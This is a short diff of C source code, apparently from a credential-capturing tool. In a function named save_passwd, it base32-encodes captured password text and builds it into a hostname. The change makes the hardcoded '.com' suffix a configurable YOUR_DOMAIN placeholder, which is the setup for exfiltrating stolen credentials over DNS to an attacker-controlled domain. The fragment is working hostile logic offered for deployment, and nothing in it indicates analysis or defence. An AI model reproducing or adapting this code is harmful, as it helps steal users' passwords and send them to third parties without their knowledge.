@@ -158,7 +158,7 @@ save_passwd(char *name,char *password,char *all, int success)
         char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
         int count = count_equals(encoded_string);
         encoded_string = modify_result(encoded_string);
-        snprintf(text, sizeof(text), "%d.%s.com", count,encoded_string); 
+        snprintf(text, sizeof(text), "%d.%s%s", count,encoded_string,YOUR_DOMAIN); 
     }
 
     strcat(all,text);
